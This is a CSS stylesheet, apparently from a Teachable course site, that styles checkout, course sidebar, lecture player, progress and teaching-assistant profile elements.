.spc__terms-text { text-align: center; font-weight: normal; width: 100%; }

.spc__terms-text label { display: flex; -webkit-box-pack: center; justify-content: center; }

#react-checkout { width: calc(100% + 30px) !important; }

#react-checkout > div > div > div { padding-left: 0px; }

#react-checkout .section-hed + div > div:first-child { padding-top: 0px; padding-left: 0px; }

@media screen and (max-width: 767px) {
  .spc__log-out { display: block; float: none; }
  .cc__existing-useAnother { width: auto; }
}

.payment-information { padding-bottom: 0px !important; margin-bottom: 0px !important; }

@media screen and (max-width: 767px) {
  .spc__section--pay { margin-left: 20px; width: calc(100% - 35px); }
}

.spc__wait { height: 70vh; min-height: 250px; padding: 30px; text-align: center; }

.spc__wait::before { content: ""; height: 100%; }

.spc__wait::before, .spc__wait-inner { display: inline-block; vertical-align: middle; }

.spc__wait-title { font-weight: bold; margin: 40px 0px 20px; }

.spc__wait-message { font-size: 14px; font-weight: bold; opacity: 0.6; }

.spc__wait-spinner { border-radius: 50%; box-sizing: border-box; height: 75px; margin: 0px auto; position: relative; width: 75px; }

.spc__wait-spinner::before { animation: 750ms linear 0s infinite normal none running spin; background-image: linear-gradient(rgb(30, 166, 154), rgba(30, 166, 154, 0.1) 40%); content: ""; border-radius: 50%; height: 100%; left: 0px; position: absolute; top: 0px; width: 100%; will-change: transform; }

.spc__wait-spinner::after { background: rgb(255, 255, 255); border-radius: 50%; content: ""; height: calc(100% - 3px); left: 1px; position: absolute; top: 1px; width: calc(100% - 3px); z-index: 1; }

.view-directory { padding-top: 50px; }

.view-directory.course-directory { background: rgb(250, 250, 250); }

.view-directory .search { margin-bottom: 30px; }

.view-directory .filter-title { margin-bottom: 30px; }

.view-directory .filter-title h2 { margin-top: 2px; margin-bottom: 3px; }

.view-directory .filter-title img.large-img-rounded { float: left; width: 65px; }

.enrolled-course-layout { width: 100%; min-height: calc(100vh - 46px); overflow: scroll; }

.course-mainbar { margin-left: 350px; background: rgb(255, 255, 255); padding: 16px 40px; height: auto; }

.course-mainbar h2.section-title { margin-bottom: 30px; font-weight: bold; }

.course-mainbar .next-lecture-wrapper { background: rgb(215, 235, 233); border-radius: 40px; margin-bottom: 20px; }

.course-mainbar .next-lecture-wrapper .start-next-lecture { margin-right: 12px; line-height: 35px; font-size: 19px; border-radius: 40px; }

.course-mainbar .course-section .btn-primary { margin-right: -65px; }

.course-sidebar { position: fixed; height: 100%; width: 350px; min-width: 350px; background-color: rgb(247, 247, 247); padding-left: 0px; padding-right: 0px; padding-bottom: 30px; border-right: 1px solid rgb(215, 218, 219); overflow: scroll; z-index: 100; }

.course-sidebar img.course-image { display: block; width: 100%; margin: 0px; }

.course-sidebar h2 { font-size: 20px; padding-left: 25px; padding-right: 25px; font-weight: bold; margin-top: 25px; line-height: 29px; }

.course-sidebar .course-progress { padding-left: 25px; padding-right: 25px; text-align: center; margin-bottom: 25px; font-size: 13px; color: rgb(30, 166, 154); margin-top: 10px !important; }

.course-sidebar .course-progress .course-progress-percentage { margin-bottom: 25px; margin-top: 10px !important; }

.course-sidebar .course-progress .percentage { font-size: 20px; font-weight: bold; }

.course-sidebar .course-access-limit { font-size: 12.642px; line-height: 19px; color: rgb(43, 54, 54); padding-top: 10px; }

.course-sidebar .course-access-limit-tool-tip-icon { color: rgb(88, 111, 111); }

.course-sidebar ul.sidebar-nav { margin: 0px; padding: 0px; }

.course-sidebar ul.sidebar-nav li { font-size: 17px; padding: 0px; }

.course-sidebar ul.sidebar-nav li a { font-size: var(--fs0); line-height: var(--lh0); padding: 13px 18px; color: rgb(43, 54, 54); display: block; margin-top: 1px; }

.course-sidebar ul.sidebar-nav li a i { margin-top: 4px; vertical-align: -1px; font-size: 22px; margin-right: 10px; }

.course-sidebar ul.sidebar-nav li a svg { margin-top: 4px; }

.course-sidebar ul.sidebar-nav li a:hover { text-decoration: none; background: rgb(230, 230, 230); }

.course-sidebar ul.sidebar-nav li.selected { border-left: 3px solid rgb(0, 0, 0); font-weight: 600; }

.course-sidebar ul.sidebar-nav li.selected a { background: rgb(255, 255, 255); border-right: 1px solid rgb(255, 255, 255); }

.course-access-limit-tool-tip { width: 190px; }

@media screen and (max-width: 767px) {
  .course-mainbar { margin-left: 0px; padding-left: 25px; padding-right: 25px; padding-top: 40px; }
  .course-mainbar h2.section-title { margin-top: 0px; }
  .course-mainbar .next-lecture-name { display: none; }
  .course-sidebar { display: none; width: 100%; }
  .course-sidebar .sticky { width: 100% !important; }
  .sidebar-nav-link { font-size: 15px; padding: 10px 15px; color: rgb(43, 54, 54); display: block; line-height: 30px; font-weight: 200; }
}

@media screen and (min-width: 767px) and (max-width: 991px) {
  .course-sidebar { width: 300px !important; min-width: 300px !important; }
  .course-sidebar .sticky { width: 299px !important; }
  .course-mainbar { margin-left: 300px; }
}

@media screen and (min-width: 767px) {
  .course-sidebar.collapse { overflow: scroll !important; }
}

.coupon-container { margin-top: 30px; }

.hidden-section { display: none; }

.social-icon { font-size: 42px; text-align: center; }

.course_desc p { font-size: 18px; margin-top: 20px; }

.course_desc li { font-size: 18px; }

.section { font-size: 20px; font-weight: bold; padding: 18px 10px 10px; }

.lecture { font-size: 18px; padding: 4px 10px 4px 0px; cursor: pointer; }

.nav-tabs .active a { font-weight: bold; }

.course-container { margin: 0px auto; padding: 0px; }

#main { background: rgb(59, 59, 59); height: 430px; }

.redeem_field { margin-top: 7px; }

.content { padding: 10px 44px; }

.text { border-bottom: 1px solid rgb(38, 38, 38); margin-top: 40px; padding-bottom: 40px; text-align: center; }

.text h2 { color: rgb(229, 229, 229); font-size: 20px; font-style: normal; font-variant: normal; font-weight: lighter; }

.counter { background: rgb(44, 44, 44); box-shadow: rgb(0, 0, 0) 0px 0px 5px inset; min-height: 100px; text-align: center; }

p.margin-left { margin-left: 20px; }

.counter h3 { color: rgb(229, 229, 229); font-size: 12px; font-style: normal; font-variant: normal; font-weight: lighter; padding-top: 20px; margin-bottom: 30px; }

#countdown { color: rgb(255, 255, 255); }

#countdown span { color: rgb(255, 255, 255); font-size: 22px; font-weight: bold; margin-left: 0px; margin-right: 0px; text-align: center; text-shadow: rgb(0, 0, 0) 0px 0px 1px; }

.curriculum-table { padding: 0px; width: 100%; margin-bottom: 20px; }

.curriculum-cell { border-right: 0px; padding-top: 7px; padding-bottom: 7px; }

.lecture-icon { font-size: 16px; }

.curriculum-lecture-name { font-size: 17px; }

.label-draft { border-radius: 11px; color: rgb(107, 109, 124); background: rgb(203, 203, 208); font-size: 12.642px; font-weight: 500; }

.not-enrolled-page { margin-top: -20px; padding-top: 55px; padding-bottom: 105px; }

.not-enrolled-container { margin-top: 30px; }

.not-enrolled-box { width: 100%; background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); border-radius: 3px; padding: 35px; margin-bottom: 25px; font-size: 18pt; opacity: 0.85; color: rgb(43, 54, 54); margin-top: 50px; }

.not-enrolled-link { font-size: 20px; }

.ta-container .ta-title, .ta-container .profile { display: block; }

.ta-container a, .ta-container p { display: inline-block; padding: 12px; line-height: 18px; margin: 5px; font-size: 14px; }

.ta-title p, .ta-container .profile p.name, .ta-container a { font-size: 14px; font-weight: 600; }

.ta-container .email { padding-left: 0px; font-size: 13px; color: rgb(176, 176, 176); }

.ta-container .profile img { display: inline-block; border-radius: 50%; margin: 5px 0px 5px 5px; max-height: 40px; width: auto; }

.ta-container .profile { border: 1px solid rgb(227, 227, 227); border-radius: 2px; }

.ta-title p { margin-left: 0px; padding-left: 8px; }

.ta-icon { width: 28px; height: 28px; background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/teachable-circle-green.svg") center center / 100% 100% no-repeat transparent !important; }

.ta-icon, .ta-title h6, .ta-container .sidebar, .ta-container .sidebar li { display: inline-block; vertical-align: middle; }

.ta-container .sidebar { display: inline-block; list-style: none; margin: 0px; float: right; }

.ta-container .sidebar li { border-left: 1px solid rgb(227, 227, 227); }

.ta-container .sidebar .unlink { color: red; }

.ta-auth-modal .form-group { border: 0px; }

.ta-auth-modal .modal-body { margin: 0px auto; }

.ta-auth-modal .modal-footer { text-align: center; margin-top: 30px; }

@media screen and (max-width: 915px) {
  .ta-container .sidebar { display: flex; width: 100%; margin: 0px; padding: 0px; float: none; }
  .ta-container .profile { border-radius: 0px; }
  .ta-container .sidebar li { width: 50%; margin: 0px; padding: 0px; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-image: initial; border-top-style: solid; border-top-color: rgb(227, 227, 227); text-align: center; border-radius: 0px; }
  .ta-container .sidebar li:last-child { padding-left: 1px; }
  .ta-container .sidebar li:first-child { border-right: 1px solid rgb(227, 227, 227); }
  .ta-container .single-btn { border-right: 0px; width: 100% !important; }
}

.lecture-page-layout { display: flex; -webkit-box-orient: horizontal; -webkit-box-direction: normal; flex-direction: row; width: 100%; min-height: calc(100vh - 46px); overflow: scroll; }

.lecture-page-layout .lecture-content .full-width-content { overflow: auto; width: 100%; }

@media screen and (max-width: 767px) {
  .lecture-page-layout { -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; }
}

header.half-height { z-index: 101; position: sticky; top: 0px; }

header.half-height .navbar-nav { float: right; margin-top: 0px; margin-right: 30px !important; }

header.half-height .lecture-left { width: 349px; float: left; display: flex; -webkit-box-pack: justify; justify-content: space-between; }

header.half-height .lecture-left .nav-icon-back { height: 50px; padding: 10px; line-height: 20px; display: block; float: left; text-align: center; width: 50px !important; }

header.half-height .lecture-left .nav-icon-back i { width: 25px; height: 25px; font-size: 20px; padding-top: 2px; }

header.half-height .lecture-left .nav-icon-back:hover { text-decoration: none; }

header.half-height .lecture-left .nav-icon-settings, header.half-height .lecture-left .nav-icon-list { width: 50px; padding: 10px; background: none; color: white; float: right; text-align: center; height: 100%; display: block; }

header.half-height .lecture-left .nav-icon-settings.nav-icon-list, header.half-height .lecture-left .nav-icon-list.nav-icon-list { background: rgb(30, 166, 154); }

header.half-height .lecture-left .nav-icon-settings.nav-icon-list.collapsed, header.half-height .lecture-left .nav-icon-list.nav-icon-list.collapsed { background: none; }

header.half-height .lecture-left .nav-icon-settings i, header.half-height .lecture-left .nav-icon-list i { width: 25px; height: 25px; font-size: 20px; padding-top: 4px; }

header.half-height .lecture-left .nav-icon-settings:hover, header.half-height .lecture-left .nav-icon-list:hover { text-decoration: none; color: white; background: rgb(30, 166, 154) !important; }

header.half-height .lecture-left .open .dropdown-toggle { background: rgb(30, 166, 154) !important; }

header.half-height .lecture-left .nav-focus:focus, header.half-height .lecture-left .nav-focus:focus-within { outline: -webkit-focus-ring-color auto 5px; }

header.half-height .lecture-left .settings-dropdown { float: right; }

header.half-height .lecture-left .settings-dropdown ul.dropdown-menu { margin-top: 0px; width: 220px; border: 1px solid rgb(213, 213, 213); padding: 0px; }

header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li { padding: 18px 15px; border-bottom: 1px solid rgb(228, 229, 229); color: rgb(108, 108, 108); font-size: 13px; }

header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li .switch { float: right; margin-top: 3px; }

header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li:last-child { border-bottom: 0px; }

header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li .playback-speed { color: rgb(30, 166, 154); border: 0px; }

header.half-height .lecture-left .settings-dropdown ul.dropdown-menu li .playback-speed:hover { color: rgb(22, 123, 114); cursor: pointer; }

header.half-height .lecture-nav { display: flex; min-height: 50px; margin-left: 349px; }

header.half-height .lecture-nav a.nav-btn { -webkit-box-align: center; align-items: center; color: white; display: flex; -webkit-box-flex: 1; flex: 1 1 0%; font-size: 16px; -webkit-box-pack: center; justify-content: center; border-left: 1px solid rgba(215, 218, 219, 0.3); }

header.half-height .lecture-nav a.nav-btn.complete, header.half-height .lecture-nav a.nav-btn:hover { background: rgb(30, 166, 154); color: white; text-decoration: none; }

header.half-height .lecture-nav a.nav-btn.disabled { cursor: default; opacity: 0.2; }

@media screen and (min-width: 768px) and (max-width: 991px) {
  header.half-height .course-mainbar { margin-left: 300px !important; }
  header.half-height .lecture-left { width: 300px; }
  header.half-height .lecture-nav { margin-left: 300px; }
}

@media screen and (max-width: 767px) {
  header.half-height .lecture-left { width: 150px; }
  header.half-height .lecture-nav { margin-left: 150px; }
  header.half-height .lecture-nav .nav-text { display: none; }
  header.half-height .nav-icon-settings, header.half-height .nav-icon-list { border-left: 1px solid rgba(215, 218, 219, 0.3); }
  header.half-height a.nav-btn { width: 50%; }
}

.course-sidebar .course-progress.lecture-page.sticky { position: fixed; top: 36px; z-index: 100; width: 349px; padding-bottom: 0px; transition: background 0.3s ease 0s; border-bottom: 1px solid rgb(215, 218, 219); background: rgba(242, 242, 242, 0.97) !important; }

.course-sidebar .course-progress.lecture-page.sticky .course-progress-percentage { margin-bottom: 10px; }

.course-sidebar .row.lecture-sidebar { padding-right: 0px; padding-bottom: 100px; margin-right: 0px !important; }

.course-sidebar .row.lecture-sidebar .course-section { margin-bottom: 20px; padding-right: 0px; }

.course-sidebar .row.lecture-sidebar .course-section .section-title { border-bottom: 1px solid rgba(30, 166, 154, 0.1); }

.course-sidebar .row.lecture-sidebar .course-section .section-item { border-bottom: 1px solid rgba(30, 166, 154, 0.1) !important; }

.course-sidebar .row.lecture-sidebar .course-section .section-item.next-lecture { border-bottom: none !important; }

.course-sidebar .row.lecture-sidebar .course-section .btn-primary { margin-right: -4px !important; }

.course-sidebar .row.lecture-sidebar .course-section .title-container { padding-right: 0px !important; }

.course-sidebar.navbar-sidebar-collapse { transition: height 0.5s ease 0s; }

.course-sidebar.navbar-sidebar-collapse.collapse.in { z-index: 100; }

.lecture-content.course-mainbar { background: rgb(255, 255, 255); -webkit-box-flex: 1; flex-grow: 1; padding: 16px 40px; height: auto; }

.lecture-content .well.locked { background-color: transparent; border: none; box-shadow: none; }

.lecture-content h2.section-title { line-height: 41px; margin-bottom: 18px; margin-top: 10px; }

.lecture-content .lecture-contents-locked, .lecture-content .drip-lecture-locked { color: rgb(69, 69, 69); font-size: 22px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 2.05; text-align: center; }

.lecture-content .lecture-contents-locked .already-enrolled, .lecture-content .drip-lecture-locked .already-enrolled { color: rgb(139, 139, 139); font-size: 18px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.67; text-align: center; }

.lecture-content .lecture-contents-locked .content-available-time, .lecture-content .drip-lecture-locked .content-available-time { color: rgb(139, 139, 139); font-size: 18px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.67; text-align: center; }

.lecture-content .lecture-contents-locked a.btn.btn-md.btn-primary, .lecture-content .drip-lecture-locked a.btn.btn-md.btn-primary { font-stretch: normal; font-style: normal; font-weight: 600; line-height: 0.67; margin-top: 40px; text-align: center; font-size: 18px !important; }

.lecture-content .drip-lecture-locked { font-size: 28px; color: rgb(140, 140, 140); padding: 100px; }

.lecture-content .lecture-attachment { margin-bottom: 20px; margin-top: 30px; overflow-wrap: break-word; word-break: break-word; hyphens: auto; }

.lecture-content .lecture-attachment .attachment { background-color: rgb(247, 247, 247); margin: 0px; font-size: 14px; padding: 6px 13px; line-height: 25px; font-weight: bold; border-bottom: 1px solid rgb(255, 255, 255); }

.lecture-content .lecture-attachment .attachment .attachment-link { color: rgb(30, 166, 154); cursor: pointer; }

.lecture-content .lecture-attachment .attachment .attachment-link:hover { color: rgb(22, 123, 114); }

.lecture-content .lecture-attachment .attachment-block-wrapper { border: 1px solid rgb(215, 218, 218); border-radius: 5px; }

.lecture-content .lecture-attachment .attachment-block-wrapper .attachment-block-label { background: rgb(43, 54, 54); color: rgb(255, 255, 255); display: block; height: 27px; line-height: 28px; border-radius: 3px; text-align: center; margin-top: -35px; margin-left: -35px; font-weight: bold; font-size: 15px; float: left; padding: 0px 15px; }

.lecture-content .lecture-attachment .attachment-block-wrapper.quiz-wrapper { padding: 35px 35px 80px; }

.lecture-content .lecture-attachment .attachment-block-wrapper.comments { padding: 35px; }

.lecture-content .lecture-attachment .attachment-pdf-embed .label { background-color: rgb(43, 54, 54); font-size: 16px; color: rgb(255, 255, 255); padding: 4px 16px; display: flex; -webkit-box-align: center; align-items: center; }

.lecture-content .lecture-attachment .attachment-pdf-embed .label svg { margin-right: 4px; }

.lecture-content .lecture-attachment .attachment-pdf-embed .wrapper { border-top: 6px solid rgb(43, 54, 54); border-bottom: 6px solid rgb(43, 54, 54); border-radius: 0px 8px 8px; overflow: hidden; }

.lecture-content .lecture-attachment .attachment-pdf-embed .wrapper .pdf-viewer { width: 100%; }

.lecture-content .lecture-attachment .attachment-wistia-player { margin: auto; height: 100%; width: 100%; }

.lecture-content .lecture-attachment .attachment-title { text-align: left !important; }

.lecture-content .lecture-attachment .video-options { margin-bottom: 65px; }

.lecture-content .lecture-attachment .video-options a { float: left; margin-right: 4px; background-color: rgb(247, 247, 247); padding: 10px 16px; cursor: pointer; color: rgb(30, 166, 154); font-weight: bold; font-size: 13px; user-select: none; border-bottom-left-radius: 6px; border-bottom-right-radius: 6px; }

.lecture-content .lecture-attachment .video-options a:hover { color: rgb(22, 123, 114); text-decoration: none; }

.lecture-content .lecture-attachment ::-webkit-media-controls { overflow: hidden !important; }

.lecture-content .lecture-attachment ::-webkit-media-controls-enclosure { width: calc(100% + 32px); margin-left: auto; }

@media screen and (max-width: 992px) {
  .lecture-content .attachment-block-wrapper.comments { border: 0px !important; padding-right: 10px !important; padding-left: 10px !important; }
}

@media screen and (max-width: 991px) {
  .lecture-content h2.section-title { line-height: 34px; font-size: 24px !important; }
  .lecture-content .lecture-contents-locked, .lecture-content .drip-lecture-locked { font-size: 16px; padding: 30px 0px; }
  .lecture-content .drip-lecture-locked { padding: 20px; }
}

.ql-align-right { text-align: right; }

.ql-align-center { text-align: center; }

.wistia_responsive_padding { height: 0px; padding-bottom: 56.25%; position: relative; }

.wistia_responsive_wrapper { position: absolute; top: 0px; left: 0px; height: 100%; width: 100%; }

.compliance-banner { background-color: rgb(225, 239, 218); color: rgb(77, 77, 77); font-size: 16px; font-stretch: normal; font-style: normal; font-weight: bold; line-height: normal; padding: 30px; position: relative; width: 100%; }

.course-section { margin-bottom: 10px; }

.course-section.course-section-locked .section-lock, .course-section.progress-locked .section-lock { display: inline; opacity: 0.5; font-size: 16px; }

.course-section.course-section-locked .item, .course-section.progress-locked .item { opacity: 0.5; }

.course-section.course-section-locked .title-container .btn-primary, .course-section.progress-locked .title-container .btn-primary { display: none; }

.course-section.course-section-locked .section-days-to-drip, .course-section.progress-locked .section-days-to-drip { display: block; float: right; font-size: 14px; font-weight: 600; margin-top: 1px; opacity: 0.5; }

.course-section.progress-locked .current-item .item { opacity: 1 !important; }

.course-section.progress-locked .current-item .title-container .btn-primary { display: block; }

.course-section .section-lock, .course-section .section-days-to-drip, .course-section .section-days-logged-in, .course-section .section-days-logged-out { display: none; }

.course-section .section-title { background: rgb(232, 232, 232); padding: 10px 16px; margin: 0px; font-size: 15px; font-weight: bold; border-bottom: 1px solid rgb(255, 255, 255); }

.course-section .course-item { background: rgb(247, 247, 247); padding: 10px 16px; margin: 0px; font-size: 17px; font-weight: normal; border-bottom: 1px solid rgb(255, 255, 255); }

.course-section ul.section-list { margin: 0px; padding: 0px; }

.course-section ul.section-list .section-item { margin: 0px; padding: 0px; list-style-type: none; border-bottom: 1px solid rgb(255, 255, 255); }

.course-section ul.section-list .section-item .item { display: block; padding: 11px 16px; background: rgb(240, 240, 240); list-style-type: none; font-size: 15px; color: rgb(66, 82, 82); text-decoration: none; font-weight: 200; }

.course-section ul.section-list .section-item .item:hover { color: rgb(22, 123, 114); background: rgb(215, 235, 233); }

.course-section ul.section-list .section-item .item .lecture-icon { padding-right: 5px; }

.course-section ul.section-list .section-item .item .btn-primary { margin-top: -3px; margin-right: -5px; }

.course-section ul.section-list .section-item .status-container { margin-top: -11px; float: left; height: 45px; margin-left: 5px; padding-top: 11px; margin-right: 20px; padding-right: 16px; }

.course-section ul.section-list .section-item .title-container { border-left: 1px solid rgba(30, 166, 154, 0.1); margin: -11px -11px -11px 41px; padding: 10px 70px 10px 10px; }

.course-section ul.section-list .section-item .status-icon { width: 20px; height: 20px; float: left; border-radius: 14px; }

.course-section ul.section-list .section-item .lecture-name { font-weight: 200; }

.course-section ul.section-list .section-item .lecture-start { opacity: 0.5; }

.course-section ul.section-list .section-item.completed .item { color: rgb(184, 184, 184); background: rgb(240, 240, 240); }

.course-section ul.section-list .section-item.completed .item:hover { color: rgb(171, 171, 171); background: rgb(230, 230, 230); }

.course-section ul.section-list .section-item.completed .item:hover .status-icon { background-color: rgb(171, 171, 171); }

.course-section ul.section-list .section-item.completed .status-icon { background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/course-complete.png") 1px 0px / 96% rgb(184, 184, 184); }

.course-section ul.section-list .section-item.completed .btn-primary { display: none; }

.course-section ul.section-list .section-item.incomplete .status-icon { background: none; box-shadow: rgb(30, 166, 154) 0px 0px 0px 2px inset; }

.course-section ul.section-list .section-item.incomplete .item:hover .status-icon { box-shadow: rgb(22, 123, 114) 0px 0px 0px 2px inset; }

.course-section ul.section-list .section-item.next-lecture .item { color: rgb(43, 54, 54); background: rgb(215, 235, 233); }

.course-section ul.section-list .section-item.next-lecture .status-icon { background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/course-incomplete.png") 1px 0px rgb(43, 54, 54); box-shadow: rgb(43, 54, 54) 0px 0px 0px 2px inset; }

.course-section ul.section-list .section-item.next-lecture .item:hover { color: rgb(43, 54, 54); background: rgb(215, 235, 233); }

.course-section ul.section-list .section-item.next-lecture .item:hover .status-icon { box-shadow: rgb(43, 54, 54) 0px 0px 0px 2px inset !important; }

#more_lecture_sections { display: none !important; }

#more_lecture_sections.collapsed { display: inline-block !important; padding: 5px 12px !important; }

.revamped_lecture_player .enrolled-course-layout { width: 100%; min-height: unset; height: calc(100vh - 60px); overflow: scroll; display: flex; }

.revamped_lecture_player .course-mainbar { width: 100%; background: rgb(255, 255, 255); padding: 55px 40px 40px; height: auto; margin-left: 0px; }

.revamped_lecture_player .course-mainbar h2.section-title { margin-bottom: 30px; font-size: var(--fs3); line-height: var(--lh3); font-weight: 600; }

.revamped_lecture_player .course-mainbar .next-lecture-wrapper { background: rgb(215, 235, 233); border-radius: 6px; margin-bottom: 20px; }

.revamped_lecture_player .course-mainbar .next-lecture-wrapper .start-next-lecture { margin-right: 12px; font-size: var(--fs1); line-height: var(--lh1); font-weight: 600; border-radius: 6px; }

.revamped_lecture_player .course-mainbar .next-lecture-wrapper .next-lecture-name { font-size: var(--fs-1); line-height: var(--lh-1); font-weight: 400; }

.revamped_lecture_player .course-sidebar { width: 350px; box-shadow: rgba(32, 39, 45, 0.15) 0px 6px 20px; background-color: var(--white); padding-left: 0px; padding-right: 0px; position: sticky; overflow: auto; display: inline-block; -webkit-box-flex: 0; flex: 0 0 auto; height: 100%; top: 0px; }

.revamped_lecture_player .course-sidebar-head { background-color: var(--linen); }

.revamped_lecture_player .course-sidebar img.course-image { display: block; width: 100%; margin: 0px; }

.revamped_lecture_player .course-sidebar h2 { padding-left: 25px; padding-right: 25px; padding-top: 25px; margin-top: 0px; font-size: var(--fs1); line-height: var(--lh1); font-weight: 600; }

.revamped_lecture_player .course-sidebar .course-progress { padding-left: 25px; padding-right: 25px; text-align: center; margin-bottom: 25px; font-size: var(--fs0); line-height: var(--lh0); font-weight: 600; color: var(--obsidian); border-bottom: 1px solid var(--gravel); margin-top: 10px !important; }

.revamped_lecture_player .course-sidebar .course-progress .course-progress-percentage { margin-bottom: 25px; margin-top: 10px !important; }

.revamped_lecture_player .course-sidebar .course-access-limit { font-size: 12.642px; line-height: 19px; color: rgb(43, 54, 54); padding-top: 10px; }

.revamped_lecture_player .course-sidebar .course-access-limit-tool-tip-icon { color: rgb(88, 111, 111); }

.revamped_lecture_player .course-sidebar ul.sidebar-nav { margin: 0px; padding: 0px; }

.revamped_lecture_player .course-sidebar ul.sidebar-nav-link .lecture-sidebar-icon { margin-right: 4px; }

.revamped_lecture_player .course-sidebar ul.sidebar-nav li { font-size: 17px; padding: 0px; border-left: 3px solid transparent; }

.revamped_lecture_player .course-sidebar ul.sidebar-nav li a { font-size: 16px; padding: 13px 18px; color: rgb(43, 54, 54); display: flex; -webkit-box-align: center; align-items: center; margin-top: 1px; }

.revamped_lecture_player .course-sidebar ul.sidebar-nav li a i { margin-top: 4px; vertical-align: -1px; font-size: 22px; margin-right: 10px; }

.revamped_lecture_player .course-sidebar ul.sidebar-nav li a svg { margin-right: 4px; }

.revamped_lecture_player .course-sidebar ul.sidebar-nav li a:hover { text-decoration: none; background: rgb(230, 230, 230); }

.revamped_lecture_player .course-sidebar ul.sidebar-nav li.selected { border-color: rgb(0, 0, 0); font-weight: 600; }

.revamped_lecture_player .course-sidebar ul.sidebar-nav li.selected a { background: rgb(255, 255, 255); border-right: 1px solid rgb(255, 255, 255); }

.revamped_lecture_player .course-access-limit-tool-tip { width: 190px; }

@media screen and (max-width: 767px) {
  .revamped_lecture_player .course-mainbar { margin-left: 0px; padding-left: 25px; padding-right: 25px; padding-top: 85px; }
  .revamped_lecture_player .course-mainbar h2.section-title { margin-top: 0px; }
  .revamped_lecture_player .course-mainbar .next-lecture-name { display: none; }
  .revamped_lecture_player .course-sidebar { display: none; width: 100%; }
  .revamped_lecture_player .course-sidebar .sticky { width: 100% !important; }
  .revamped_lecture_player .sidebar-nav-link { font-size: 15px; padding: 10px 15px; color: rgb(43, 54, 54); display: block; line-height: 30px; font-weight: 200; }
}

@media screen and (min-width: 767px) and (max-width: 991px) {
  .revamped_lecture_player .course-sidebar { width: 300px !important; }
  .revamped_lecture_player .course-sidebar .sticky { width: 299px !important; }
}

@media screen and (min-width: 767px) {
  .revamped_lecture_player .course-sidebar.collapse { height: 100% !important; overflow: scroll !important; }
}

.revamped_lecture_player .coupon-container { margin-top: 30px; }

.revamped_lecture_player .hidden-section { display: none; }

.revamped_lecture_player .social-icon { font-size: 42px; text-align: center; }

.revamped_lecture_player .course_desc p { font-size: 18px; margin-top: 20px; }

.revamped_lecture_player .course_desc li { font-size: 18px; }

.revamped_lecture_player .section { font-size: 20px; font-weight: bold; padding: 18px 10px 10px; }

.revamped_lecture_player .lecture { font-size: 18px; padding: 4px 10px 4px 0px; cursor: pointer; }

.revamped_lecture_player .nav-tabs .active a { font-weight: bold; }

.revamped_lecture_player .course-container { margin: 0px auto; padding: 0px; }

.revamped_lecture_player #main { background: rgb(59, 59, 59); height: 430px; }

.revamped_lecture_player .redeem_field { margin-top: 7px; }

.revamped_lecture_player .content { padding: 10px 44px; }

.revamped_lecture_player .text { border-bottom: 1px solid rgb(38, 38, 38); margin-top: 40px; padding-bottom: 40px; text-align: center; }

.revamped_lecture_player .text h2 { color: rgb(229, 229, 229); font-size: 20px; font-style: normal; font-variant: normal; font-weight: lighter; }

.revamped_lecture_player .counter { background: rgb(44, 44, 44); box-shadow: rgb(0, 0, 0) 0px 0px 5px inset; min-height: 100px; text-align: center; }

.revamped_lecture_player p.margin-left { margin-left: 20px; }

.revamped_lecture_player .counter h3 { color: rgb(229, 229, 229); font-size: 12px; font-style: normal; font-variant: normal; font-weight: lighter; padding-top: 20px; margin-bottom: 30px; }

.revamped_lecture_player #countdown { color: rgb(255, 255, 255); }

.revamped_lecture_player #countdown span { color: rgb(255, 255, 255); font-size: 22px; font-weight: bold; margin-left: 0px; margin-right: 0px; text-align: center; text-shadow: rgb(0, 0, 0) 0px 0px 1px; }

.revamped_lecture_player .curriculum-table { padding: 0px; width: 100%; margin-bottom: 20px; }

.revamped_lecture_player .curriculum-cell { border-right: 0px; padding-top: 7px; padding-bottom: 7px; }

.revamped_lecture_player .lecture-icon { font-size: 16px; }

.revamped_lecture_player .curriculum-lecture-name { font-size: 17px; }

.revamped_lecture_player .label-draft { border-radius: 11px; color: rgb(107, 109, 124); background: rgb(203, 203, 208); font-size: 12.642px; font-weight: 500; }

.revamped_lecture_player .not-enrolled-page { margin-top: -20px; padding-top: 55px; padding-bottom: 105px; }

.revamped_lecture_player .not-enrolled-container { margin-top: 30px; }

.revamped_lecture_player .not-enrolled-box { width: 100%; background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); border-radius: 3px; padding: 35px; margin-bottom: 25px; font-size: 18pt; opacity: 0.85; color: rgb(43, 54, 54); margin-top: 50px; }

.revamped_lecture_player .not-enrolled-link { font-size: 20px; }

.revamped_lecture_player .ta-container .ta-title, .revamped_lecture_player .ta-container .profile { display: block; }

.revamped_lecture_player .ta-container a, .revamped_lecture_player .ta-container p { display: inline-block; padding: 12px; line-height: 18px; margin: 5px; font-size: 14px; }

.revamped_lecture_player .ta-title p, .revamped_lecture_player .ta-container .profile p.name, .revamped_lecture_player .ta-container a { font-size: 14px; font-weight: 600; }

.revamped_lecture_player .ta-container .email { padding-left: 0px; font-size: 13px; color: rgb(176, 176, 176); }

.revamped_lecture_player .ta-container .profile img { display: inline-block; border-radius: 50%; margin: 5px 0px 5px 5px; max-height: 40px; width: auto; }

.revamped_lecture_player .ta-container .profile { border: 1px solid rgb(227, 227, 227); border-radius: 2px; }

.revamped_lecture_player .ta-title p { margin-left: 0px; padding-left: 8px; }

.revamped_lecture_player .ta-icon { width: 28px; height: 28px; background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/teachable-circle-green.svg") center center / 100% 100% no-repeat transparent !important; }

.revamped_lecture_player .ta-icon, .revamped_lecture_player .ta-title h6, .revamped_lecture_player .ta-container .sidebar, .revamped_lecture_player .ta-container .sidebar li { display: inline-block; vertical-align: middle; }

